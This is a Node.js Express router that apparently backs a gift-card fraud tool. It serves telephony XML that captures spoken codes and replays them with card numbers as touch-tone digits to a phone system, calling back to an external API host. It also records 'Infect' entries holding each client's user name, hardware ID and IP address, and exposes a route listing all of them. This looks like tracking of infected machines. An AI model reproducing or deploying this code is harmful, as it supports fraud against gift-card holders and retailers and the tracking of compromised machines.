const express = require('express');
var path = require('path')
var bodyParser = require('body-parser')
const fs = require('fs');
const Infect = require('../models/infect');
const { exception } = require('console');
const router = express.Router()
router.use(bodyParser.urlencoded({ extended: true }));

router.get('/giftcard/response/capbefore/:cardno', async (req, res) => {
    res.contentType('application/xml');
    res.send(`<?xml version="1.0" encoding="UTF-8"?>
    <?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Pause length="20"/>
  <Gather input="speech" action="https://api.suicide.wtf/v1/giftcard/response/create/before/343143241243" method="POST"/>
</Response>
`)
})


router.get('/giftcard/response/capafter', async (req, res) => {
    res.contentType('application/xml');
    res.send(`
    <?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Pause length="40"/>
  <Gather input="speech" action="https://api.suicide.wtf/v1/giftcard/response/create/after" method="POST"/>
</Response>
    `)
})

router.get('/giftcard/response/nocap', async (req, res) => {
    res.contentType('application/xml');
    res.send(`
    <?xml version="1.0" encoding="UTF-8"?>
<Response>
<Pause length="60"/>
</Response>`
    )
})

router.post('/giftcard/response/create/before/:cardno', async (req, res) => {
    let code = parseInt(req.body.Speech.replace(/^\D+|\D+$/g, ""))
    console.log(req.body.Speech)
    res.contentType('application/xml');
    res.send(`
    <Response>
    <Play digits="${code}WWWWWW1"></Play>
    <Pause length="10"/>
    <Play digits="${req.params.cardno}#"></Play>
    <Pause length="22"/>
</Response>
`
    )

})

router.post('/giftcard/response/create/after', async (req, res) => {
    console.log(req.body.Speech)
    let code = parseInt(req.body.Speech.replace(/^\D+|\D+$/g, ""))
    res.contentType('application/xml');
    res.send(`
    <?xml version="1.0" encoding="UTF-8"?>
<Response>
   <Play digits=${code}></Play>
   <Pause length="7"/>
</Response>`
    )
})

router.post('/giftcard/user/check', async (req, res) => {
    try {
        await Infect.create({
            user: req.body.user,
            hwid: req.body.hwid,
            ip: req.connection.remoteAddress
        })
        res.json({ authenticated: true })
    } catch (e) {
        res.json({ error: e, authenticated: false })
    }

})

router.get('/giftcard/user/all', async (req, res) => {
    try {
        const allUsers = await Infect.find({})
        res.json(allUsers)
    } catch (e) {
        res.json({ error: e, authenticated: false })
    }
})
module.exports = router;